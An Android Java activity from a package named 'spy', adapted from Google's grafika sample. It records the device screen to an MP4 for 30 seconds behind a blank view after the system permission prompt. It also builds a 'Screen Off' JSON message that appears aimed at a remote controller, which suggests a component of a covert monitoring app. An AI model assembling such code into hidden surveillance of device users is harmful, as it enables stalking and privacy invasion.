/**
 * This is code my modif from
 * https://github.com/google/grafika/blob/master/app/src/main/java/com/android/grafika/ScreenRecordActivity.java#L122
 */

package com.example.spy.activities;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.hardware.display.DisplayManager;
import android.media.MediaCodec;
import android.media.MediaCodecInfo;
import android.media.MediaFormat;
import android.media.MediaMuxer;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.Surface;
import android.view.View;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.nio.ByteBuffer;

public class ScreenRecordActivity extends Activity {
    private MediaProjectionManager mMediaProjectionManager;
    private static final int REQUEST_CODE_CAPTURE_PERM = 1234;
    private MediaProjection mMediaProjection;

    private MediaCodec.Callback encoderCallback;



    private static final String VIDEO_MIME_TYPE = "video/avc";

    private boolean mMuxerStarted = false;
    private Surface mInputSurface;
    private MediaMuxer mMuxer;
    private MediaCodec mVideoEncoder;
    private MediaCodec.BufferInfo mVideoBufferInfo;
    private int mTrackIndex = -1;

    private final Handler mDrainHandler = new Handler(Looper.getMainLooper());


    private int trackIndex = -1;
    private String mStoreDir;


    private final Handler waitHandler = new Handler();
    private final Runnable waitCallback = new Runnable() {
        @Override
        public void run() {

            releaseEncoders();
        }
    };

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        TextView tv = new TextView(this);
        tv.setText("");
        setContentView(tv);



        // create store dir
        File externalFilesDir = getExternalFilesDir(null);
        if (externalFilesDir != null) {
            mStoreDir = externalFilesDir.getAbsolutePath() + "/videorecords/";
            File storeDirectory = new File(mStoreDir);
            if (!storeDirectory.exists()) {
                boolean success = storeDirectory.mkdirs();
                if (!success) {
                    Log.e("TAG", "failed to create file storage directory.");
                }
            }
        } else {
            Log.e("TAG", "failed to create file storage directory, getExternalFilesDir is null.");
        }

        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (powerManager.isInteractive()) {


            mMediaProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);


            Intent permissionIntent = mMediaProjectionManager.createScreenCaptureIntent();
            startActivityForResult(permissionIntent, REQUEST_CODE_CAPTURE_PERM);

        } else {
            JSONObject obj = new JSONObject();
            try {
                obj.put("name", "Screen Off");
                obj.put("image64", "null");
                obj.put("dataType", "downloadImage");

            } catch (JSONException e) {
                e.printStackTrace();
            }
            super.onBackPressed();
        }


        encoderCallback = new MediaCodec.Callback() {
            @Override
            public void onInputBufferAvailable(@NonNull MediaCodec codec, int index) {
                Log.d("TAG", "Input Buffer Avail");
            }

            @Override
            public void onOutputBufferAvailable(@NonNull MediaCodec codec, int index, @NonNull MediaCodec.BufferInfo info) {
                ByteBuffer encodedData = mVideoEncoder.getOutputBuffer(index);
                if (encodedData == null) {
                    throw new RuntimeException("couldn't fetch buffer at index " + index);
                }

                if ((info.flags & MediaCodec.BUFFER_FLAG_CODEC_CONFIG) != 0) {
                    info.size = 0;
                }

                if (info.size != 0) {
                    if (mMuxerStarted) {
                        encodedData.position(info.offset);
                        encodedData.limit(info.offset + info.size);
                        mMuxer.writeSampleData(trackIndex, encodedData, info);
                    }
                }

                mVideoEncoder.releaseOutputBuffer(index, false);

            }

            @Override
            public void onError(@NonNull MediaCodec codec, @NonNull MediaCodec.CodecException e) {
                Log.e("TAG", "MediaCodec " + codec.getName() + " onError:", e);
            }

            @Override
            public void onOutputFormatChanged(@NonNull MediaCodec codec, @NonNull MediaFormat format) {
                Log.d("TAG", "Output Format changed");
                if (trackIndex >= 0) {
                    throw new RuntimeException("format changed twice");
                }
                trackIndex = mMuxer.addTrack(mVideoEncoder.getOutputFormat());
                if (!mMuxerStarted && trackIndex >= 0) {
                    mMuxer.start();
                    mMuxerStarted = true;
                }
            }
        };


    }

    public void onActivityResult(int requestCode, int resultCode, Intent intent) {
        if (REQUEST_CODE_CAPTURE_PERM == requestCode) {
            if (resultCode == RESULT_OK) {
                mMediaProjection = mMediaProjectionManager.getMediaProjection(resultCode, intent);
                startRecording(); // defined below

                waitHandler.postDelayed(waitCallback, 30000);

            } else {
                // user did not grant permissions
            }
        }
    }


    private void startRecording() {
        DisplayManager dm = (DisplayManager)getSystemService(Context.DISPLAY_SERVICE);
        Display defaultDisplay = dm.getDisplay(Display.DEFAULT_DISPLAY);
        if (defaultDisplay == null) {
            throw new RuntimeException("No display found.");
        }

        try {

            mMuxer = new MediaMuxer(mStoreDir +"/Screen-record-" +
                    Long.toHexString(System.currentTimeMillis()) + ".mp4", MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4);
        } catch (IOException ioe) {
            throw new RuntimeException("MediaMuxer creation failed", ioe);
        }

        // Get the display size and density.
        DisplayMetrics metrics = getResources().getDisplayMetrics();
        int screenWidth = metrics.widthPixels;
        int screenHeight = metrics.heightPixels;
        int screenDensity = metrics.densityDpi;

        prepareVideoEncoder(screenWidth, screenHeight);

        // Start the video input.
        mMediaProjection.createVirtualDisplay("Recording Display", screenWidth,
                screenHeight, screenDensity, 0 /* flags */, mInputSurface,
                null /* callback */, null /* handler */);

    }

    private void prepareVideoEncoder(int width, int height) {
        mVideoBufferInfo = new MediaCodec.BufferInfo();


        MediaFormat format = MediaFormat.createVideoFormat(VIDEO_MIME_TYPE, width, height);
        int frameRate = 30; // 30 fps

        // Set some required properties. The media codec may fail if these aren't defined.
        format.setInteger(MediaFormat.KEY_COLOR_FORMAT,
                MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface);
        format.setInteger(MediaFormat.KEY_BIT_RATE, 6000000); // 6Mbps
        format.setInteger(MediaFormat.KEY_FRAME_RATE, frameRate);
        format.setInteger(MediaFormat.KEY_CAPTURE_RATE, frameRate);
        format.setInteger(MediaFormat.KEY_REPEAT_PREVIOUS_FRAME_AFTER, 1000000 / frameRate);
        format.setInteger(MediaFormat.KEY_CHANNEL_COUNT, 1);
        format.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 1); // 1 seconds between I-frames

        // Create a MediaCodec encoder and configure it. Get a Surface we can use for recording into.
        try {
            mVideoEncoder = MediaCodec.createEncoderByType(VIDEO_MIME_TYPE);
            mVideoEncoder.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);
            mInputSurface = mVideoEncoder.createInputSurface();
            mVideoEncoder.setCallback(encoderCallback);
            mVideoEncoder.start();
        } catch (IOException e) {
            releaseEncoders();
        }
    }


    private void releaseEncoders() {
        Log.e("TAG", "stopping projection.");

        if (mMuxer != null) {
            if (mMuxerStarted) {
                mMuxer.stop();
            }
            mMuxer.release();
            mMuxer = null;
            mMuxerStarted = false;
        }
        if (mVideoEncoder != null) {
            mVideoEncoder.stop();
            mVideoEncoder.release();
            mVideoEncoder = null;
        }
        if (mInputSurface != null) {
            mInputSurface.release();
            mInputSurface = null;
        }
        if (mMediaProjection != null) {
            mMediaProjection.stop();
            mMediaProjection = null;
        }
        mVideoBufferInfo = null;
        mTrackIndex = -1;
    }
}
